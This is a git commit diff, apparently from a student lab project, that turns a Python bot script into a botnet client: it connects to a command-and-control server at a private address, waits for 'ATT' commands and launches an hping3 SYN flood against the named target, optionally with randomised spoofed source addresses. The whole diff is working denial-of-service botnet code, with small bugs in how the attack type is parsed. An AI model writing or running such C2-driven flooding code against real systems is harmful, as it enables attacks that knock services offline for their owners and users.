2d0560bcf10f9fc2cca288197454481d3a6a0a85
Ertussy <riccardo.ferro-2@studenti.unitn.it>
2026-05-06 19:34:10 +0000

    Add bot attack

--- vm/code/loader/bot.py
+++ vm/code/loader/bot.py
@@ -1,5 +1,7 @@
-import socket, time, os, requests
+import socket, time, os
 import urllib.request
+import subprocess
+
 
 CNC_IP = "10.10.10.100"
 CNC_PORT = 5002
@@ -7,7 +9,7 @@ CNC_PORT = 5002
 def connect_to_cnc():
     while True:
         try:    
-            s = socker.socket()
+            s = socket.socket()
             s.connect((CNC_IP, CNC_PORT))
             return s
         except:
@@ -17,30 +19,47 @@ def listen(sock):
     while True:
         try:
             data = sock.recv(1024).decode().strip()
-            if not data:
-                break
 
-            print(f"Received: {data}", flush = True)
-
-            if data.startewith("ATT"):
-                target = data.split(" ")[1]
-                attack(target)
-
-        except:
-            break
-
-def attack(target):
+            if data.startswith("ATT"):
+                parts = data.split()
+                if len(parts) > 1:
+                    if len(parts) == 2:
+                        target = parts[1]
+                        attack(target,1)
+                    else:
+                        target=parts[1]
+                        type_att =parts[2]
+                        attack(target,type_att)
+        except Exception as e:
+            print("Errore:", e)
         
-    url = f"http://{target}"
+def attack(target,type_att):
+    # hping 3 -S --flood --rand-source -p 80 {target}
 
-    with urllib.request.urlopen(url) as response:
-        # Legge il contenuto della risposta
-        body = response.read().decode('utf-8')
-        
-        # Puoi anche accedere allo status code e agli header
-        status_code = response.getcode()
-        
-        print(f"Status Code: {status_code}")
+    # Construct the hping3 command
+    if type_att == 1:
+        hping_cmd = [
+            "sudo", "hping3",
+            "-S",
+            "-p", "80",    
+            "--flood",
+            target
+        ]
+    elif type_att == 2:
+        hping_cmd = [ "sudo", "hping3", "-S", "-p", "--rand-source", "80","--flood", target]
+           
+    
+    print(f"Running: {' '.join(hping_cmd)}")
+    # Start the process
+    process = subprocess.Popen(hping_cmd)
+    
+    # Run for 10 seconds
+    time.sleep(10)
+    
+    # Stop the process
+    process.terminate()
+    process.wait()
+    print("Hping3 stopped.")
 
 while True:
     sock = connect_to_cnc()
